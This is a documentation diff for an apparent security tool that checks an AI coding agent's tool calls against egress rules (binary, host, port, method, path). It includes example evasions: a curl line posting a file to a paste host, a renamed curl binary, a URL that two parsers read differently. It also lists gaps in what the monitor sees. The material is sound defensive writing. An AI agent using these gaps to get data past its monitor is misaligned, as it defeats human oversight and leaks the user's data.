@@ -1140,6 +1140,7 @@ and destination hosts a workload or repository is expected to use. Each `PreTool
   `b.a.internal.example`, not `internal.example` or `evilinternal.example`. Loopback (`localhost`,
   `127.0.0.1`, `[::1]`) is always in profile.
 - `action` is `report` (the default) or `block`.
+- `egressRules` and `egressDefault` are accepted too; see [Egress rules](#egress-rules).
 - At most 256 profiles per source are read; the rest are listed as malformed.
 
 **Matching.**
@@ -1230,6 +1231,152 @@ malformed, sources, fail-open), `test/workload-profile-hook.test.mjs` (the real 
 an enrolled and an unenrolled laptop, the trust test, the SDK), the third case in
 `test/agent-sdk-parity.test.mjs`, and `test/mcp-gateway-profile.test.mjs` (a real gateway in server mode:
 block, report, coach and the trust rules).
+
+### Egress rules
+
+A profile's `hosts` list answers "may this workload reach this host at all". Egress rules answer the finer
+question a sandbox's network policy answers: which binary may reach which host, on which port, with which
+HTTP method and under which path, and whether that is allowed, reported or refused. The module is
+[`cli/egress-rules.mjs`](../cli/egress-rules.mjs). It is evaluated inside `evaluateProfile()`, so the hook,
+`@moorai/agent-sdk` (`decideToolCall`) and `moorai-serve` run it at the same point as the profile check,
+with the same trust sources, and one call returns one decision.
+
+**Why one concept.** Rules live in the same documents as profiles and compose with them. They are not a
+second allow-list next to `hosts`. A profile may carry `egressRules` and `egressDefault`. The console policy
+and the machine-wide config may also carry them at the top level, where they apply to every call whether
+or not a profile matches (a laptop has no `serviceId`). `hosts` keeps its meaning: a miss is
+`PROFILE_DRIFT`. An egress rule's verdict is `EGRESS_RULE`. The model-endpoint allow-list
+(`endpointAllow`, #63) is unchanged and separate. It judges only LLM provider hosts and base-URL overrides,
+and it denies with its own threat id.
+
+**Policy shape.**
+
+```json
+"egressRules": [
+  { "id": "gh-read", "binary": "curl", "host": "api.github.com", "port": 443,
+    "method": ["GET", "HEAD"], "path": "/repos/acme/*", "action": "allow" },
+  { "id": "no-paste", "host": "*.paste.example", "action": "block" },
+  { "binary": "mcp__fetch__*", "host": "docs.example", "action": "alert" }
+],
+"egressDefault": "block"
+```
+
+- `host` is required: an exact name or IP (`[::1]` for IPv6), or `*.suffix`. `*.github.com` matches
+  `api.github.com` and `a.b.github.com`, not `github.com` or `evilgithub.com`. A bare `*`, a URL, a port or
+  a userinfo part is refused. Names are lowercased, a trailing dot is dropped, and they are normalised the
+  way the WHATWG URL parser normalises a host.
+- `binary` is one name or a list, case-insensitive, `*` a glob. For a shell call it is the command word
+  with its directory and `.exe` removed (`/usr/bin/curl` and `curl.exe` are `curl`; `iwr` and `irm` are
+  `invoke-webrequest` and `invoke-restmethod`). For any other call it is the tool name (`WebFetch`,
+  `mcp__<server>__<tool>`).
+- `port` is an integer or a list. A URL without an explicit port has its scheme's default (443 for https,
+  22 for ssh, 5432 for postgres, and so on).
+- `method` is one verb or a list, case-insensitive. `path` is `/exact` or `/prefix*` (a `*` only at the
+  end). Paths are compared after dot segments are resolved; the query and fragment are never compared.
+- `action` is `allow`, `alert` or `block`. `id` (a slug) and `description` are optional.
+- At most 512 rules per list.
+
+**Order.** For each destination the call names, the rules are read in order: the matched profile's, then
+the console policy's, then the machine-wide config's. The first rule whose every key matches decides. With
+no match the default applies: the profile's `egressDefault`, else the policy's, else the machine-wide
+config's, else `allow`. Loopback (`localhost`, `127.0.0.1`, `[::1]`) with no matching rule is allowed
+whatever the default; an explicit rule still applies to it. The call's verdict is the strictest across its
+destinations.
+
+**Unknown fields.** Many destinations are only partly known. `ssh host` has no path, `git clone https://…`
+and an MCP call have no method, and a URL in a heredoc body has no binary. An `allow` rule that sets a key
+the destination does not know does not match it. An `alert` or `block` rule does. Not knowing never widens
+what is allowed. In practice, write `allow` rules for git, ssh and MCP calls without `method` and `path`.
+
+**What a call names.**
+- `Bash` / `PowerShell`: every URL with a network scheme written anywhere in the command (`http`, `https`,
+  `ws`, `ftp`, `ssh`, `git`, `postgres`, `mysql`, `mongodb`, `redis`, `amqp`, `socks5` and others), plus
+  scheme-less hosts given to an HTTP client (`curl example.com/x`, `http :3000/x`, `iwr host`), plus the
+  bare hosts of `ssh` (`-p`, `-J`), `scp`, `sftp`, `rsync` (`host::module` is port 873), `git`
+  (`git@host:org/repo`), and `nc` / `ncat` / `netcat` / `telnet` (`host port`; `-l` listens and is not
+  egress). A curl, wget or PowerShell proxy (`-x`, `--proxy`, `-Proxy`) is a destination too.
+- The method is read for curl (`-X`, `-I` HEAD, `-T` PUT, a data flag POST, `-G` GET), wget (`--method`,
+  `--post-*` POST, `--spider` HEAD), httpie and xh (an explicit verb, or POST when data items are given),
+  and `Invoke-WebRequest` / `Invoke-RestMethod` (`-Method`, `-CustomMethod`). A bare `curl` or `wget` under
+  the PowerShell tool may be the Invoke-WebRequest alias, so its method is unknown. Other binaries have no
+  method.
+- Each URL belongs to the command word of the segment it is written in, after `sudo`, `env`, `timeout`,
+  `xargs`, `nohup`, `nice` and similar wrappers and shell keywords. `sh -c`, `bash -lc`, `powershell
+  -Command`, `powershell -EncodedCommand` (decoded), `cmd /c`, `eval`, `Invoke-Expression`, `$( … )`,
+  backticks and `find -exec` are parsed as their own commands. A URL the segment parse cannot place
+  (a heredoc body, or past the parse limits) is judged with no binary.
+- `WebFetch`: its `url`, method `GET`, binary `webfetch`.
+- `mcp__*`: every URL in every string of the arguments (keys included, at most 1 MiB of text), binary the
+  tool name, method unknown.
+- Where curl and the WHATWG URL parser disagree on a URL's host, both hosts are judged. Measured with curl
+  8.7.1: for `http://allowed.invalid\@evil.invalid/` curl resolves `evil.invalid`, `new URL()` says
+  `allowed.invalid`.
+- The first 256 distinct destinations are judged in full. Beyond that, further destinations are judged by
+  binary, host and port, with method and path unknown. Beyond 4096 the call gets the strictest action any
+  rule or default in force could give, with the reason "the call names more destinations than can be
+  judged". Padding a call with allowed URLs cannot hide one that is not allowed.
+
+**Binary, honestly.** The binary is the program the command line names, not the process that opens the
+socket. MoorAI reads the call's text. It does not see the network. So an `allow` rule's `binary` must match
+the URL's own segment, and an `alert` or `block` rule's `binary` matches when any command word in the call
+names it. Under a curl-scoped block, `printf https://paste.example/x | while read u; do curl -d @f "$u";
+done` is curl's even though the URL is in `printf`'s segment. A git alias, a Makefile, an npm script or a
+renamed binary (`./curl` is `curl`; `cp $(which curl) x; ./x` is `x`) still hides the real program. A
+binary-scoped rule is a guard against the ordinary case, not an identity.
+
+**Outcome.** `alert` and `block` verdicts each post one content-free alert per distinct binary, host,
+port and method (at most 8 per call): category `Egress rule`, `reasonCode` `EGRESS_RULE`, stage `egress`,
+`egressAction`, `egressBinary`, `egressHost`, `egressPort`, `egressMethod`, `egressRule` (`policy#2`,
+`system#0`, `profile:<id>#1`, `default`, or `overflow`), `egressRuleId` when the rule has an id, and
+`profileId` when a profile matched. No path, query, command text or argument value is sent. `allow`
+verdicts post nothing. An `alert` lets the call go on to every other check. A `block` denies it with the
+reason `egress to <host>:<port> by <binary> is blocked by egress rule "<id>" (<ref>)` (or `by
+egressDefault`). The agent sees that reason locally; the host is already in the call it wrote. The ledger
+row's `reasonCode` is `EGRESS_RULE`. The SDK's result carries `reasonCode` and `driftKinds` (which includes
+`egress`), and `profileId` only when a profile matched. When a blocking profile drift and an egress block
+both apply, the profile's reason and `PROFILE_DRIFT` win; both alerts are posted.
+
+On an unenrolled device a block coaches, exactly as a blocking profile does: the call is allowed and the
+coach message carries the reason. Server mode and the SDK enforce.
+
+**Where rules can come from.** The same two places as profiles: the verified console policy and the
+root-owned machine-wide config. An `egressRules` or `egressDefault` key in a repository's
+`.claude/settings.json` (top level or `env`), a repo-local `.moorai/config.json`, `~/.moorai/config.json`
+or the environment is ignored.
+
+**Malformed rules.** At the top level, a malformed rule is dropped and the rest apply; a malformed
+`egressDefault` is ignored (treated as unset). Inside a profile, a malformed rule or default drops the whole
+profile, as any malformed profile list does. Both are listed in the same `Workload profile ignored
+(malformed)` alert as malformed profiles (`source`, `index`, the rule's `id` if any, and a reason that
+starts `egressRules:` or names `egressDefault`), never the value.
+
+**Failure.** Evaluation never throws. An error allows the call with no alert, as the profile check does.
+
+**Measured.** About 3 µs per Bash call with 50 rules (node 22, macOS); a 200 KB command takes 5 ms. The
+SDK parity test's fourth case puts top-level rules with `egressDefault: "block"` over the full payload set:
+214 payloads, 0 mismatches between the hook and the SDK, 29 egress denials. The benign v2 corpus count is
+unchanged (20 of 602) because no rule is in force there; with a policy that sets rules, the false-positive
+rate depends entirely on those rules and was not measured.
+
+**Limits.**
+- Only destinations written in the call are judged. A host in a variable (`curl $URL`), a script file, a
+  config file (`git push origin`, `~/.ssh/config` aliases), a DNS lookup (`dig`, `nslookup`) or an
+  encoded blob other than `-EncodedCommand` is not seen. A URL whose host is a variable
+  (`https://$HOST/x`) is judged as the literal host `$host`, which matches no allow rule.
+- Every URL written in a shell command is a destination, including one that is only printed or written to
+  a file (`echo https://x >> README`) or sent as a header. Under `egressDefault: "block"` that is a false
+  positive, the same property the profile's `hosts` list has.
+- Binary attribution follows the command line, not the process (above).
+- The HTTP MCP gateway (`mcp-gateway/`) calls `evaluateProfile()` with empty arguments, so it judges no
+  egress rules, and the MCP stdio proxy does not run the profile or the egress check at all. The hook
+  covers MCP calls made by Claude Code; other clients behind the stdio proxy are not covered.
+- `PreToolUse` only. Tested on macOS only.
+
+Tests: `test/egress-rules.test.mjs` (validation, destinations from every parser, host, port, method and
+path matching, unknown fields, binary attribution, order and defaults, outcomes and content-freedom, the
+URL-parser disagreement, padding, malformed rules, fail-open), `test/egress-rules-hook.test.mjs` (the real
+hook in server mode and unenrolled, the trust test, the SDK callback and `decideToolCall`), the fourth case
+in `test/agent-sdk-parity.test.mjs`, and the ledger row in `test/provenance.test.mjs`.
 
 ### Across the session: session risk and the runaway circuit breaker
 
@@ -2136,6 +2283,10 @@ Stated rather than papered over.
   not hosts. A `repo` match follows `.git/config`, and in the hook
   a `serviceId` can come from `~/.moorai/config.json`; both are in the agent's write scope. Tested on
   macOS only.
+- **Egress rules** (above) judge only destinations written in the call's text, on `PreToolUse`, in the hook,
+  the SDK and `moorai-serve`. The HTTP MCP gateway and the MCP stdio proxy do not judge them. The binary is
+  the command word the line names, not the process that opens the socket. Every URL in a shell command
+  counts, including one that is only printed. Tested on macOS only.
 - **The lifecycle events, the claim check, the session signals and provenance are tested through the real
   hook with scripted stdin, not watched in a live Claude Code session.** The `Stop` / `SubagentStop` /
   `PostToolUseFailure` / `PreCompact` input fields are taken from the hooks reference, not from a captured
